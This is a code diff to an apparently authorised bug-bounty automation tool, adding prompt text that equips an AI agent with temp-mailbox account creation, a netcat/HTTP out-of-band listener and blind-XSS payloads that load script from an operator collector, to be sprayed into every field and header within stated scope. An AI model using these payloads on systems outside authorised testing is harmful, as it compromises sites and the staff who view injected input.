@@ -70,7 +70,7 @@ read, and every write is scope-checked:
 Installed tools on your PATH (they already route through the proxy): subfinder,
 dnsx, httpx, katana, ffuf, plus curl, jq, python3, and the usual shell. Call
 them by name. For a port scan use `hk portscan`, never nmap/masscan.
-
+{infra}
 Work in this directory. Save tool output to files here and import it; do not
 paste large output back to yourself. Call `hk progress` as you go so the
 operator can see how far along you are.
@@ -82,6 +82,37 @@ When you are done, write a short plain-English summary to ./handoff.md for the
 next phase: what you found, what is worth a closer look, and anything you could
 not finish. Then reply DONE.
 """
+
+
+MAILBOX_HELP = """Temporary mailboxes (mail.tm) for sign-up, password-reset and OTP flows, and for making
+attacker/victim accounts for access-control testing. Use them ONLY when the program allows signing up
+with any email; if the policy requires a platform address (@intigriti.me / @bugcrowdninja.com), use that
+instead (see the scope rules and your researcher handle). Steps:
+  GET  https://api.mail.tm/domains                          (pick a domain)
+  POST https://api.mail.tm/accounts   body {"address":"victim-<epoch>@<domain>","password":"TestPassword123!"}
+  POST https://api.mail.tm/token      body {"address":"<email>","password":"TestPassword123!"}  -> bearer token
+  GET  https://api.mail.tm/messages            -H "Authorization: Bearer <token>"   (list)
+  GET  https://api.mail.tm/messages/<id>       -H "Authorization: Bearer <token>"   (read)
+Use clear prefixes (attacker-, victim-, reset-). Extract OTPs / magic links and continue the flow."""
+
+OOB_HELP = """Out-of-band / SSRF / XXE listener: your own server at {host} (replaces Burp Collaborator).
+Start a listener on this VPS when you need one: `python3 -m http.server {port}` or `nc -lvnp {port}`
+(ports {ports}). Point payloads at http://{host}:{port}/<unique-token-per-test> so each callback is
+attributable. After sending the payload to the target, check the listener log to confirm the callback and
+save those log lines as evidence on the finding. Stop the listener when done. Use for SSRF, blind XXE and
+any blind/OOB vulnerability."""
+
+BLIND_XSS_HELP = """Blind XSS: inject beacons pointing at {url} into EVERY text field, parameter and header
+(User-Agent, Referer), and any name / profile / address / comment / support-message field that staff or an
+admin might later view. Blind XSS is high value and often missed, so spray it widely wherever you submit
+input - within scope and the rate limit. A callback to the collector is the proof (the operator watches
+it). Use several payload forms, for example:
+  "'><script src={url}></script>
+  "><img src=x onerror=import('{url}')>
+  javascript:import('{url}')
+Also send it as the User-Agent on ordinary requests to catch log-viewer XSS. For each place you inject,
+record a lead (hk add lead blind-xss <endpoint> --evidence "beacon in <field>") so a later callback can be
+traced back after this phase ends."""
 
 
 class AgentPhase(Phase):
@@ -112,7 +143,7 @@ class AgentPhase(Phase):
         self._write_settings(ctx, workdir)
         env = self._env(ctx, proxy, workdir)
         scope_summary = self._scope_summary(ctx)
-        prompt = PREAMBLE.format(scope_summary=scope_summary, task=self.task(ctx))
+        prompt = PREAMBLE.format(scope_summary=scope_summary, infra=self._infra(ctx), task=self.task(ctx))
         agent_cfg = ctx.settings.get("agent", {})
         minutes = float(agent_cfg.get("phase_minutes", {}).get(self.id, self.timeout_minutes))
         turns = int(agent_cfg.get("phase_turns", {}).get(self.id, self.max_turns))
@@ -150,7 +181,23 @@ class AgentPhase(Phase):
         scope = ctx.scope()
         ua = next((v for k, v in scope.required_headers.items() if k.lower() == "user-agent"), "")
         env["HUNTER_USER_AGENT"] = ua or "Mozilla/5.0"
-        env["HUNTER_EXTRA_HOSTS"] = ",".join(ctx.settings.get("agent", {}).get("extra_hosts", []))
+        oob = ctx.settings.get("oob", {}) or {}
+        oob_hosts = []
+        if oob.get("enabled", True):
+            if oob.get("callback_host"):
+                oob_hosts.append(str(oob["callback_host"]))
+                env["HUNTER_OOB_HOST"] = str(oob["callback_host"])
+                env["HUNTER_OOB_PORTS"] = ",".join(str(p) for p in oob.get("listener_ports", []))
+            if oob.get("blind_xss_url"):
+                from urllib.parse import urlsplit
+                env["HUNTER_BLIND_XSS_URL"] = str(oob["blind_xss_url"])
+                host = urlsplit(str(oob["blind_xss_url"])).hostname
+                if host:
+                    oob_hosts.append(host)
+            if oob.get("temp_mail", True):
+                env["HUNTER_TEMP_MAIL"] = "1"
+        extra = list(ctx.settings.get("agent", {}).get("extra_hosts", [])) + oob_hosts
+        env["HUNTER_EXTRA_HOSTS"] = ",".join(extra)
         return env
 
     def _write_settings(self, ctx: Context, workdir: Path) -> None:
@@ -169,6 +216,24 @@ class AgentPhase(Phase):
         claude_dir = workdir / ".claude"
         claude_dir.mkdir(parents=True, exist_ok=True)
         (claude_dir / "settings.json").write_text(json.dumps(settings, indent=2), encoding="utf-8")
+
+    def _infra(self, ctx: Context) -> str:
+        """Your own testing infrastructure, offered to the agent and gated on the
+        program rules: the agent uses each only where the policy allows."""
+        oob = ctx.settings.get("oob", {}) or {}
+        if not oob.get("enabled", True):
+            return ""
+        parts = ["", "== YOUR TESTING INFRASTRUCTURE (yours, not targets - already allowed through the guard) =="]
+        if oob.get("temp_mail", True):
+            parts.append(MAILBOX_HELP)
+        if oob.get("callback_host"):
+            ports = oob.get("listener_ports") or [80, 8080]
+            parts.append(OOB_HELP.format(host=oob["callback_host"], port=ports[0],
+                                         ports=", ".join(str(p) for p in ports)))
+        if oob.get("blind_xss_url"):
+            parts.append(BLIND_XSS_HELP.format(url=oob["blind_xss_url"]))
+        parts.append("Never aim this infrastructure at anything out of scope; the scope and rate rules still apply.")
+        return "\n".join(parts) + "\n"
 
     def _scope_summary(self, ctx: Context) -> str:
         scope = ctx.scope()
